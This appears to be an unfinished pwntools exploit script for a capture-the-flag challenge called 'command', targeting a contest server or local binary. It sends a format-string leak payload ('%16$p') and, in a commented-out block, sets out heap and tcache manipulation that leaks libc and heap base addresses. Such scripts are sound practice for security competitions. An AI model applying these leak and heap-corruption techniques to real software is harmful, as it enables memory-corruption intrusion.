from pwn import *
import sys
import ctypes
from ctypes import *
import os

context.arch="amd64"


if(len(sys.argv)>1):
    io=remote('command.pwn2.win',1337)
    context.noptrace=True
else:
    io=process("./command",env = {"LD_PRELOAD" : "./libc.so.6"})

def setup_env():
    libc = ctypes.cdll.LoadLibrary("./libc.so.6")
    LIBC = ELF("./libc.so.6")
    time = libc.time(0)
    os.system("touch ./ommands/{}".format(time))

def send_name(name):
    io.sendafter('Your name: ',name)

def add(priority,command):
    io.sendlineafter('> ','1')
    io.sendlineafter('Priority: ',str(priority))
    io.sendafter('Command: ',command)

def view(idx):
    io.sendlineafter('> ','2')
    io.sendlineafter('index: ',str(idx))

def free(idx):
    io.sendlineafter('> ','3')
    io.sendlineafter('index: ',str(idx))

def list():
    io.sendlineafter('> ','4')

def ret():
    io.sendlineafter('> ','5')

def send_commands(ID):
    io.sendlineafter('which rbs?\n',str(ID))
    io.recvuntil('You command Mr. ')


if __name__=="__main__":
    setup_env()
    send_name('%16$p')
    add(12345,'1'*0x170)
    gdb.attach(io)
    """
    add(12345,'2'*0x170)
    free(1)
    free(0)
    add('1','a')
    for i in xrange(8):
        add(12345,str(i)*0x170)
    for i in xrange(8):
        free(i)
    for i in range(7):
        add(1234605,str(i)*0x170)
    add('123456789123','a')
    view(7)
    io.recvuntil('Command: ')
    libc_base = u64(io.recv(6) + '\x00'*2) - 0x3ebc61
    log.info("libc_base = " + hex(libc_base))
    free(0)
    for i in range(7):
        free(i)
    free(7)
    free(8)
    ret()
    send_commands(12345)
    heap_base = int(io.recvuntil("!").split("!")[0],16) << 12
    log.info("heap_base = " + hex(heap_base))
    """
    io.interactive()
